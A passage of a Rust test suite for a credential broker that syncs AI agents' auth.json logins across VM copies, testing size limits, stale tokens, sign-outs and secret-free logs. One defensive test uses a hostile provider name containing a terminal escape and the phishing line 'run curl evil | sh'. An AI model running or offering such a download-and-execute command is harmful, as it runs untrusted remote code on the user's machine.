        assert_eq!(w.done(&hostile).first, [format!("p{round}")]);
    }
    // Then each as big as a login may be.
    let big = "a".repeat(MAX_AGENT_ENTRY - 200);
    let all: Vec<String> = (0..MAX_AGENT_PROVIDERS)
        .map(|round| login(round, &big, NOW + 2))
        .collect();
    write(&hostile, &format!("{{{}}}", all.join(",")));
    assert_eq!(w.done(&hostile).taken.len(), MAX_AGENT_PROVIDERS);
    let bytes = fs::metadata(w.store_path()).unwrap().len();
    assert!(bytes > 1 << 20, "past the old limit: {bytes}");
    assert!(bytes < pi::MAX_AUTH_FILE, "{bytes}");
    // Everything still reads it, and the owner still gets through.
    for copy in [&other, &toolbox] {
        w.done(copy);
        assert_eq!(held(copy).len(), MAX_AGENT_PROVIDERS);
    }
    let mut entries = held(&toolbox);
    entries.insert(
        "mine".to_owned(),
        serde_json::json!({"type":"api_key","key":"owner"}),
    );
    write(&toolbox, &Value::Object(entries).to_string());
    assert_eq!(w.done(&toolbox).taken, ["mine"]);
}

/// R3: a guest's text doesn't reach the owner's terminal as a provider's name.
#[test]
fn a_rejected_name_is_never_repeated() {
    let w = world();
    let a = w.copy("a");
    let phish = format!(
        "\\u001b[2JYour Mac is at risk: run curl evil | sh {}",
        "x".repeat(500_000)
    );
    write(
        &a,
        &format!(r#"{{"{phish}":{{"type":"api_key","key":"k"}}}}"#),
    );
    let report = w.done(&a);
    assert!(w.stored().is_empty());
    assert_eq!(report.bad.len(), 1);
    for why in report.bad.values() {
        assert_eq!(
            why,
            "its auth.json has a login under a name no provider has"
        );
    }
    // A name that's fine, with what's wrong with it said.
    let b = w.copy("b");
    write(&b, r#"{"openai":{"type":"api_key","key":"!x"}}"#);
    assert!(w.done(&b).bad["openai"].contains("login for openai"));
}

/// S5: the owner can clear what agents offered, all at once, which a toolbox's
/// `{}` can't be told from a read that missed the file.
#[test]
fn the_owner_can_forget_what_agents_offered() {
    let w = world();
    let (hostile, other, toolbox) = (w.copy("hostile"), w.copy("other"), w.toolbox());
    w.owner_signs_in(&oauth("owner", NOW + 1000));
    w.done(&toolbox);
    for name in ["junk-a", "junk-b"] {
        let mut entries = held(&toolbox);
        entries.insert(
            name.to_owned(),
            serde_json::json!({"type":"api_key","key":name}),
        );
        write(&hostile, &Value::Object(entries).to_string());
        w.done(&hostile);
    }
    let offered = w.broker.offered();
    assert_eq!(offered.keys().collect::<Vec<_>>(), ["junk-a", "junk-b"]);
    assert_eq!(offered["junk-a"], "hostile");
    w.done(&other);
    w.done(&toolbox);
    assert_eq!(held(&other).len(), 3);

    let names = ["junk-a".to_owned(), "junk-b".to_owned(), "none".to_owned()];
    assert_eq!(
        w.broker.forget(&names, NOW + 1).unwrap(),
        ["junk-a", "junk-b"]
    );
    assert_eq!(w.stored().keys().collect::<Vec<_>>(), ["anthropic"]);
    assert!(w.broker.offered().is_empty());
    assert!(w.broker.notices(NOW + 1).is_empty());
    // Out of every copy at its next look, and nothing's restored.
    for copy in [&other, &toolbox] {
        let report = w.done(copy);
        assert!(report.stale.is_empty(), "{report:?}");
        assert_eq!(held(copy).keys().collect::<Vec<_>>(), ["anthropic"]);
    }
    assert_eq!(held(&toolbox).len(), 1);
    // The same offered again goes nowhere, and takes itself back out.
    w.done(&hostile);
    let mut entries = held(&hostile);
    entries.insert(
        "junk-a".to_owned(),
        serde_json::json!({"type":"api_key","key":"junk-a"}),
    );
    write(&hostile, &Value::Object(entries).to_string());
    assert_eq!(w.done(&hostile).stale, ["junk-a"]);
    assert!(!w.stored().contains_key("junk-a"));
    assert!(!held(&hostile).contains_key("junk-a"));
    // Something new is a new offer, told as one: the agent has to be stopped too.
    write(
        &hostile,
        r#"{"anthropic":{"type":"oauth","access":"owner","refresh":"r-owner","expires":1800000001000},"junk-c":{"type":"api_key","key":"c"}}"#,
    );
    assert_eq!(w.done(&hostile).first, ["junk-c"]);
    assert_eq!(w.broker.offered()["junk-c"], "hostile");
    // The owner signing in to it takes it off the list.
    let mut entries = held(&toolbox);
    entries.insert(
        "junk-c".to_owned(),
        serde_json::json!({"type":"api_key","key":"owner"}),
    );
    w.done(&toolbox);
    write(&toolbox, &Value::Object(entries).to_string());
    w.done(&toolbox);
    assert!(w.broker.offered().is_empty());
}

/// N5, N6: what's kept beside the store going bad is said, and left alone until
/// there's something to write.
#[test]
fn what_is_kept_beside_the_store_is_told_of_when_bad_and_not_rewritten() {
    let w = world();
    let a = w.copy("a");
    w.done(&a);
    assert!(w.broker.problems().is_empty());
    // With nothing to say it writes nothing.
    assert!(!w.broker.store_dir().join(NOTICES_FILE).exists());
    write(&a, r#"{"openai":{"type":"api_key","key":"sk"}}"#);
    w.done(&a);
    let notices = w.broker.store_dir().join(NOTICES_FILE);
    let before = fs::metadata(&notices).unwrap().modified().unwrap();
    std::thread::sleep(std::time::Duration::from_millis(20));
    w.done(&a);
    assert_eq!(fs::metadata(&notices).unwrap().modified().unwrap(), before);
    for name in [NOTICES_FILE, HISTORY_FILE, OFFERED_FILE] {
        let path = w.broker.store_dir().join(name);
        fs::write(&path, "not json").unwrap();
        let problems = w.broker.problems();
        assert_eq!(problems.len(), 1, "{name}: {problems:?}");
        assert!(problems[0].contains(name), "{problems:?}");
        // It goes on all the same, and leaves it there to be looked at.
        w.done(&a);
        assert_eq!(fs::read_to_string(&path).unwrap(), "not json", "{name}");
        fs::remove_file(path).unwrap();
    }
    assert!(w.broker.problems().is_empty());
}

/// B2: a store nothing can read doesn't stop the owner.
#[test]
fn the_owners_sign_in_replaces_a_store_nothing_can_read() {
    for what in ["hand edited", "too big"] {
        let w = world();
        let (a, toolbox) = (w.copy("a"), w.toolbox());
        w.done(&toolbox);
        let bad = match what {
            "too big" => format!(
                r#"{{"x":{{"type":"api_key","key":"{}"}}}}"#,
                "k".repeat(pi::MAX_AUTH_FILE as usize + 1)
            ),
            _ => format!("{{{COMMAND}}}"),
        };
        fs::write(w.store_path(), &bad).unwrap();
        // It stops everything but that, and nothing goes out.
        assert!(w.broker.sync(&a, NOW).is_err(), "{what}");
        assert!(w.broker.sync(&toolbox, NOW).is_err(), "{what}");
        assert_eq!(fs::read_to_string(w.store_path()).unwrap(), bad);
        assert!(!a.dir.join("auth.json").exists(), "nothing went out");
        // Then the owner signs in.
        write(&toolbox, r#"{"groq":{"type":"api_key","key":"owner"}}"#);
        let report = w.done(&toolbox);
        assert_eq!(report.taken, ["groq"], "{what}");
        let aside = report.set_aside.unwrap();
        assert_eq!(
            fs::read_to_string(w.broker.store_dir().join(aside)).unwrap(),
            bad,
            "nothing's lost"
        );
        w.done(&a);
        assert_eq!(held(&a)["groq"]["key"], "owner");
    }
}

/// S2: a toolbox's Pi writing back what it read before a refresh elsewhere isn't
/// a sign-in, and would spend a token that's already been spent everywhere.
#[test]
fn an_old_login_written_back_from_a_stale_read_is_no_sign_in() {
    let w = world();
    let (toolbox, vm) = (w.toolbox(), w.copy("vm"));
    w.done(&toolbox);
    let old =
        r#"{"anthropic":{"type":"oauth","refresh":"SPENT","access":"a1","expires":1800000900000}}"#;
    write(&toolbox, old);
    w.done(&toolbox);
    w.done(&vm);
    write(
        &vm,
        r#"{"anthropic":{"type":"oauth","refresh":"NEW","access":"a2","expires":1800009000000}}"#,
    );
    w.done(&vm);
    w.done(&toolbox);
    assert_eq!(held(&toolbox)["anthropic"]["refresh"], "NEW");
    write(&toolbox, old);
    let report = w.done(&toolbox);
    assert_eq!(report.stale, ["anthropic"]);
    assert!(report.taken.is_empty(), "{report:?}");
    assert_eq!(w.stored()["anthropic"]["refresh"], "NEW");
    assert_eq!(held(&toolbox)["anthropic"]["refresh"], "NEW", "put right");
    w.done(&vm);
    assert_eq!(held(&vm)["anthropic"]["refresh"], "NEW");
    // An agent's the same, which would otherwise be left on a spent token.
    write(&vm, old);
    assert_eq!(w.done(&vm).stale, ["anthropic"]);
    assert_eq!(held(&vm)["anthropic"]["refresh"], "NEW");
    // A key can come round again: the owner going back to one is a sign-in.
    write(&toolbox, r#"{"anthropic":{"type":"api_key","key":"one"}}"#);
    w.done(&toolbox);
    write(&toolbox, r#"{"anthropic":{"type":"api_key","key":"two"}}"#);
    w.done(&toolbox);
    write(&toolbox, r#"{"anthropic":{"type":"api_key","key":"one"}}"#);
    assert_eq!(w.done(&toolbox).taken, ["anthropic"]);
}

/// Pi writes `{}` when a read misses the file. One provider going is a sign-out,
/// and every one at once isn't.
#[test]
fn a_file_read_as_missing_doesnt_sign_out_of_everything() {
    let w = world();
    let (toolbox, vm) = (w.toolbox(), w.copy("vm"));
    w.owner_signs_in(r#"{"groq":{"type":"api_key","key":"g"},"xai":{"type":"api_key","key":"x"}}"#);
    w.done(&toolbox);
    w.done(&vm);
    write(&toolbox, "{}");
    let report = w.done(&toolbox);
    assert_eq!(report.stale, ["groq", "xai"]);
    assert!(report.removed.is_empty());
    assert_eq!(w.stored().len(), 2);
    assert_eq!(held(&toolbox).len(), 2, "put back");
    write(&vm, "{}");
    assert_eq!(w.done(&vm).stale, ["groq", "xai"]);
    assert_eq!(held(&vm).len(), 2, "put back");
}

/// S3: only `prepare_vm` makes a directory, or a deleted agent's could come back
/// with keys in it.
#[test]
fn a_sync_never_brings_back_a_deleted_agents_directory() {
    let w = world();
    w.owner_signs_in(r#"{"openai":{"type":"api_key","key":"owner-secret"}}"#);
    let gone = w.root.join("deleted-agent");
    let copy = vm_copy("deleted-agent", &gone);
    assert_eq!(w.sync(&copy), Synced::Gone);
    assert!(!gone.exists());
}

#[test]
fn a_hand_edited_store_stops_agents_and_is_left_alone() {
    let w = world();
    let a = w.copy("a");
    fs::create_dir_all(w.broker.store_dir()).unwrap();
    let text = format!("{{{COMMAND}}}");
    fs::write(w.store_path(), &text).unwrap();
    let e = w.broker.sync(&a, NOW).unwrap_err();
    assert!(e.to_string().contains("run a command"), "{e}");
    assert_eq!(fs::read_to_string(w.store_path()).unwrap(), text);
    assert!(!a.dir.join("auth.json").exists(), "nothing went out");
}

#[test]
fn a_vm_finds_the_owners_settings_read_only_and_nothing_of_the_login() {
    let w = world();
    let config = w.root.join("config");
    fs::create_dir_all(config.join("extensions")).unwrap();
    fs::write(config.join("settings.json"), "{}").unwrap();
    for name in ["auth.json", "AUTH.JSON.LOCK", "sessions"] {
        fs::write(config.join(name), "").unwrap();
    }
    w.owner_signs_in(r#"{"groq":{"type":"api_key","key":"gsk"}}"#);
    let a = vm_copy("a", &w.root.join("a"));
    let synced = w.broker.prepare_vm(&a, false, NOW).unwrap();
    assert!(matches!(synced, Synced::Done(_)), "{synced:?}");
    let guest = Path::new(pi::GUEST_CONFIG_DIR);
    for name in ["extensions", "settings.json"] {
        assert_eq!(fs::read_link(a.dir.join(name)).unwrap(), guest.join(name));
    }
    for name in ["AUTH.JSON.LOCK", "sessions"] {
        assert!(fs::symlink_metadata(a.dir.join(name)).is_err(), "{name}");
    }
    // Its login is a real file of its own, with the store's in it.
    assert!(
        fs::symlink_metadata(a.dir.join("auth.json"))
            .unwrap()
            .is_file()
    );
    assert_eq!(held(&a)["groq"]["key"], "gsk");

    // What the VM made of its own is kept; what's gone from the owner's goes.
    fs::remove_file(a.dir.join("settings.json")).unwrap();
    fs::write(a.dir.join("settings.json"), "mine").unwrap();
    fs::write(a.dir.join("notes"), "mine").unwrap();
    fs::remove_dir(config.join("extensions")).unwrap();
    fs::write(config.join("models.json"), "{}").unwrap();
    w.broker.prepare_vm(&a, false, NOW).unwrap();
    assert_eq!(
        fs::read_to_string(a.dir.join("settings.json")).unwrap(),
        "mine"
    );
    assert_eq!(fs::read_to_string(a.dir.join("notes")).unwrap(), "mine");
    assert!(fs::symlink_metadata(a.dir.join("extensions")).is_err());
    assert_eq!(
        fs::read_link(a.dir.join("models.json")).unwrap(),
        guest.join("models.json")
    );
}

#[test]
fn a_vm_booting_clears_a_lock_and_a_running_one_doesnt() {
    let w = world();
    let a = vm_copy("a", &w.root.join("a"));
    fs::create_dir_all(a.dir.join("auth.json.lock")).unwrap();
    assert_eq!(w.broker.prepare_vm(&a, true, NOW).unwrap(), Synced::Busy);
    assert!(a.dir.join("auth.json.lock").is_dir());
    assert!(matches!(
        w.broker.prepare_vm(&a, false, NOW).unwrap(),
        Synced::Done(_)
    ));
}

#[test]
fn what_it_keeps_holds_no_login() {
    let w = world();
    w.owner_signs_in(r#"{"groq":{"type":"api_key","key":"gsk-secret"}}"#);
    let a = w.copy("a");
    w.done(&a);
    let state = fs::read_to_string(&a.state).unwrap();
    assert!(state.contains("groq"), "{state}");
    assert!(!state.contains("gsk-secret"), "{state}");
    // Nor do its notices.
    write(&a, r#"{"xai":{"type":"api_key","key":"xai-secret"}}"#);
    w.done(&a);
    let notices = fs::read_to_string(w.broker.store_dir().join(NOTICES_FILE)).unwrap();
    assert!(notices.contains("xai"), "{notices}");
    assert!(!notices.contains("xai-secret"), "{notices}");
}
